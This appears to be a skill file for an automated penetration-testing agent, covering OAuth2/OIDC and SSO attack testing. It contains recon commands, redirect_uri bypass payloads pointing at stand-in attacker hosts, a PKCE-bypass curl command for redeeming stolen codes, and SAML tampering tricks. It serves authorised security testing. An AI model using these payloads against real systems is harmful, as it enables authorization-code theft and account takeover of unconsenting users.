---
name: oauth_sso
description: OAuth2/OIDC and SSO testing for redirect_uri abuse, state/PKCE flaws, token leakage, and account takeover
---

# OAuth / SSO Provider

An OAuth2 authorization server or OIDC/SSO provider brokers identity between users, identity providers (IdPs), and relying-party clients (the "consumers" / service providers). The attacker's objective is to steal authorization codes or tokens, forge or replay them, or abuse loose flow validation (redirect_uri, state, PKCE, response_type) to authenticate as another user, pivot a token issued for one client into another, or escalate scope — culminating in account takeover. This skill covers the *flow and trust* layer; for raw token signature/claim forgery see the JWT/OIDC skill.

## Attack Surface

**Authorization-server endpoints**
- `/authorize`, `/oauth2/authorize` — front-channel; consumes `client_id`, `redirect_uri`, `response_type`, `scope`, `state`, `nonce`, `code_challenge`
- `/token`, `/oauth2/token` — back-channel code/refresh exchange
- `/.well-known/openid-configuration`, `/.well-known/oauth-authorization-server` — full endpoint + capability map
- `/jwks.json`, `/keys` — signing keys
- `/userinfo`, `/introspect`, `/revoke`, `/logout`, `/connect/endsession`, device-code endpoints
- Dynamic client registration: `/register`, `/connect/register`

**Relying-party (client) endpoints**
- `/callback`, `/oauth/callback`, `/auth/<provider>/callback`, `/signin-oidc`, `/login/oauth2/code/<provider>`
- "Login with Google/GitHub/Microsoft/Apple" buttons, account-linking flows, SAML ACS endpoints

**Exposed values**
- `redirect_uri` allowlist behavior, `state`/`nonce` generation, PKCE method (`S256` vs `plain` vs absent)
- Issued access/ID/refresh tokens, their `aud`/`azp`/`scope`/`exp`, and where the client stores them (cookie, localStorage, fragment)
- Implicit-flow leakage via URL fragment and Referer headers

## Recon & Enumeration

```bash
# Resolve + probe the provider/client hosts
subfinder -d target.tld -silent | httpx -silent -title -tech-detect -sc -o hosts.txt

# Pull the OIDC/OAuth discovery document — the source of truth for endpoints + supported features
curl -s https://target.tld/.well-known/openid-configuration | jq .
curl -s https://target.tld/.well-known/oauth-authorization-server | jq .
# Note: authorization_endpoint, token_endpoint, jwks_uri, response_types_supported,
#       code_challenge_methods_supported, grant_types_supported, scopes_supported

# Inspect signing keys (feeds JWT forgery: kty/alg/kid)
curl -s "$(curl -s https://target.tld/.well-known/openid-configuration | jq -r .jwks_uri)" | jq .

# Discover client callback paths and login buttons
katana -u https://app.target.tld -jc -d 3 -silent | grep -Ei 'callback|oauth|signin-oidc|/auth/|redirect_uri|client_id' | sort -u
ffuf -u https://app.target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302,401,403 -fs 0 | grep -Ei 'callback|oauth|sso|login|logout'

# Tech/CVE sweep of the provider (Keycloak/Auth0/Okta/Cognito/IdentityServer have known CVEs)
nuclei -u https://target.tld -tags oauth,oidc,saml,jwt,exposure -s critical,high,medium -silent -j -o nuclei_oauth.jsonl
nuclei -u https://target.tld -as -s critical,high -rl 50 -c 20 -timeout 10 -retries 1 -silent

# OAST oracle for blind redirect/SSRF exfil (jku/x5u fetch, redirect_uri to attacker)
interactsh-client -v    # yields a fresh *.oast.fun domain to embed in redirect_uri

# Token signature/claim attack matrix once you hold a token
jwt_tool -t https://api.target.tld/me -rh "Authorization: Bearer <token>" -M at
```

Asset-specific helpers to install when needed:
- `pipx install saml2-burp` or use `python3 -m pip install python3-saml` for SAML signature-wrapping tests; `xmlsec1` for canonicalization checks.
- Burp Suite extensions (when a proxy is in scope): `OAuth Scan`, `JWT Editor`, `SAML Raider` for in-flow tampering.
- `npm i -g oauth2-mock-server` / a local listener (`python3 -m http.server`) to act as a rogue client or IdP when testing trust boundaries.

## Methodology

1. **Map the topology.** From discovery docs, decide: is the target the *authorization server*, the *relying-party client*, or both? Identify every `client_id`, every registered `redirect_uri`, and which flow each login uses (auth code, code+PKCE, implicit, hybrid, device).
2. **Capture a clean flow.** Walk a full login as a low-priv user, recording the `/authorize` request, the redirect with `code`/`state`, and the `/token` exchange. This baseline reveals which params are validated.
3. **Probe redirect_uri validation.** Mutate `redirect_uri` (see Techniques) and observe whether the server still issues a code/token to a non-canonical destination.
4. **Test state/nonce.** Remove or reuse `state`; replay a flow with a victim-chosen `state` to assess login CSRF and code-fixation.
5. **Test PKCE.** Downgrade `S256`→`plain`, omit `code_challenge`, or reuse/omit `code_verifier` at `/token`.
6. **Test token handling.** Exchange a code twice; replay across clients; swap ID token for access token; check `scope`/`aud`/`azp` enforcement at resource servers.
7. **Test account linking & IdP trust.** Attempt to link an attacker IdP identity (unverified email, mismatched `sub`) to a victim local account.
8. **Test logout/refresh.** Confirm revocation actually invalidates refresh tokens and sessions; test refresh reuse without rotation detection.
9. **Validate, PoC, escalate.** Convert any leaked code/token into a concrete cross-account or cross-client access proof.

## Key Weaknesses / Techniques

### redirect_uri validation flaws
The single richest OAuth bug class — a loose redirect lets you steal the code/token.
```
# Open redirect / allowlist bypass variants (one per request, observe if a code is issued):
redirect_uri=https://attacker.oast.fun/cb
redirect_uri=https://app.target.tld.attacker.oast.fun/cb     # suffix not anchored
redirect_uri=https://app.target.tld@attacker.oast.fun/cb     # userinfo confusion
redirect_uri=https://attacker.oast.fun#@app.target.tld/cb    # fragment confusion
redirect_uri=https://app.target.tld/cb/../../redirect?u=//attacker.oast.fun  # path traversal + chained open redirect
redirect_uri=https://app.target.tld/cb%2f%2e%2e%2fattacker   # encoded traversal
redirect_uri=https://app.target.tld.evil.com                 # subdomain/regex anchor gap
redirect_uri=https://app.target.tld/cb?next=//attacker.oast.fun  # extra param smuggle
redirect_uri=//attacker.oast.fun                             # scheme-relative
```
If only the *registered* prefix is checked, append `/../` or an open redirect on the legit host. If a wildcard subdomain is registered (`https://*.target.tld/cb`), take over or register any subdomain. For mobile, custom-scheme `redirect_uri` (`com.app://cb`) can be claimed by a malicious app.

### state / CSRF & code fixation
- **Missing/unvalidated `state`** → login CSRF: craft an `/authorize` link, deliver to victim; their session links to an attacker-controlled IdP account, or you fixate a code. Verify by removing `state` and confirming `/callback` still completes.
- **Predictable `state`** (timestamp, sequential, reflected verbatim) → forge a victim-targeted callback.

### PKCE downgrade / bypass
```
# At /authorize:  drop code_challenge entirely, or send method=plain
code_challenge=attacker_known&code_challenge_method=plain
# At /token: if server doesn't bind verifier, a stolen code (e.g. via redirect leak)
# can be redeemed without the original code_verifier:
curl -s -X POST https://target.tld/oauth2/token \
  -d grant_type=authorization_code -d code=<stolen> \
  -d redirect_uri=https://app.target.tld/cb -d client_id=<client>
```
If the auth server advertises only `S256` in `code_challenge_methods_supported` but still accepts `plain` or a missing verifier, PKCE protection is void.

### code/token replay & cross-client confusion
- **Code reuse:** redeem the same `code` twice at `/token`. A second success = no single-use enforcement.
- **Client mix-up (IdP confusion):** capture a code issued for Client A and redeem it at Client B's `/token` with B's `client_id`; if `aud`/`client_id` binding is weak, you get a token for B.
- **Token swap:** present an ID token where an access token is expected (and vice versa) at resource servers that only verify signature, not `typ`/`aud`/`azp`.

### scope / consent escalation
- Add high-value scopes (`admin`, `offline_access`, `*`) to `/authorize` and check if granted silently without re-consent.
- Downgrade-then-upgrade: get consent for a narrow scope, then request a broader scope at refresh time.

### account linking / IdP email-trust abuse
- Register an attacker IdP identity with the victim's email; if the relying party links accounts by **email alone** (ignoring verified-email claim or `sub`), logging in with the attacker IdP grants the victim's local account.
- Pre-account-takeover: create a local account with the victim's email *before* they sign up via SSO; the SSO login may merge into your account.

### implicit-flow & fragment leakage
- For `response_type=token`/`id_token`, the token lands in the URL fragment — leaks via Referer, browser history, open redirects, and third-party JS. Force implicit on a server that also supports it and chain with an open redirect.

### SAML SSO (when federation uses SAML)
- XML signature wrapping (XSW), `SignatureValue` stripping on IdP-initiated SSO, comment-truncation in `NameID` (`admin@x.com<!---->.evil.com`), and unsigned-assertion acceptance. Use SAML Raider / `python3-saml` to mutate and resubmit at the ACS.

## Validation

1. **Redirect leak:** show that submitting your mutated `redirect_uri` causes the authorization server to deliver a real `code`/`token` to your `*.oast.fun` listener (capture the inbound request in `interactsh-client`). Then redeem that code at `/token` and call `/userinfo` to prove it is a *victim-context* credential.
2. **PKCE/state bypass:** demonstrate a complete login that succeeds with `state` removed or with a stolen code redeemed without the matching `code_verifier`.
3. **Cross-account:** with two test identities, complete an attacker-initiated flow that yields access to the *other* account's `/userinfo` / protected resource — identical requests differing only in the manipulated flow parameter.
4. **Cross-client/token swap:** show a token minted for Client A or an ID token being accepted by Client B / an access-only API.
5. Confirm reproducibility and record the exact `/authorize` and `/token` parameters (`client_id`, `redirect_uri`, `response_type`, `state`, `code_challenge*`) that control the outcome. Keep PoCs minimal — read one harmless owner-only field, do not pivot further than needed to prove impact.

## False Positives

- `redirect_uri` reflected in an error page but the server returns an `invalid_redirect_uri` error and **never issues a code** — no leak.
- An OAST hit whose source IP is your own browser/test box (a client-side fetch made it), not the authorization server.
- "Missing `state`" where the framework substitutes PKCE + same-site session cookies for CSRF protection and the flow can't be cross-initiated.
- ID-token-as-access-token "accepted" by an endpoint that re-validates `aud`/`typ` and ultimately returns 401/403.
- Code "reuse" that succeeds only within a sanctioned idempotency window and returns the *same* token, not a fresh one.
- Account-link by email where the provider enforces a `email_verified:true` claim and matching `sub` — not exploitable.
- Wildcard/regex `redirect_uri` matches that still require a host you cannot register or control.

## Chaining & Impact

- Loose `redirect_uri` + open redirect on a legit host → authorization-code theft → `/token` exchange → **full account takeover** of any user who clicks the crafted login link.
- Missing `state` (login CSRF) + account linking → silently bind victim sessions to an attacker IdP identity → persistent access.
- PKCE downgrade + code leak → ATO even on a "secure" public client.
- SSRF in `jku`/`x5u`/`request_uri` fetch (provider pulls attacker-hosted JWKS/request object) → sign tokens the server trusts → **token minting** (hand off to the SSRF and JWT skills).
- Refresh token without rotation/revocation → durable access surviving password reset and logout.
- Stolen ID token with org claims → privilege escalation across every relying party that trusts this IdP (SSO blast radius is org-wide).

## Pro Tips

1. The discovery document (`/.well-known/openid-configuration`) is your map — diff `response_types_supported`, `grant_types_supported`, and `code_challenge_methods_supported` against what the server *actually* accepts; advertised constraints are often not enforced.
2. Always test `redirect_uri` mutation one variant per request and watch for a `302` that still carries `code=`/`access_token=` to a non-canonical host — that single response is the whole bug.
3. Prefer attacking the *relying party's* `redirect_uri` handling and account-linking logic; well-known IdPs (Google/Okta/Auth0) are usually hardened, but client integrations are sloppy.
4. Fragment (`#`) params don't reach the server but do reach client JS and leak via Referer — for implicit/hybrid flows, route the leak through an open redirect or a third-party script sink.
5. Try `prompt=none` to test silent re-auth and whether scopes are granted without consent UI.
6. Test logout/`end_session` honestly: confirm the refresh token is dead afterward — many providers kill the cookie but keep refresh tokens alive.
7. When you control any subdomain of the target, re-check wildcard `redirect_uri` registrations — that turns a "low" config note into ATO.
8. Correlate OAST hits to a specific request by restarting `interactsh-client` between payloads; embed the per-test domain inside `redirect_uri`, `request_uri`, or a `jku` to attribute the egress to the server, not your browser.
